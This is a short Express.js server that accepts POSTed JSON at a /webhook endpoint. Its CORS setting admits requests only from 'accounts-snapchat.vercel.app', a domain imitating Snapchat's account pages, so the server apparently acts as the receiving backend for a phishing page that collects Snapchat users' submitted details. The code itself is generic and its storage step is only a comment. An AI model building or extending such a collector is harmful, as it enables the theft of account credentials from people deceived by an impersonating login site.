const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors({ origin: 'https://accounts-snapchat.vercel.app' }));
app.use(express.json());
app.post('/webhook', (req, res) => {
  const data = req.body;
  // Store data (e.g., in a file or database)
  res.status(200).send('OK');
});
app.listen(3000, () => {});
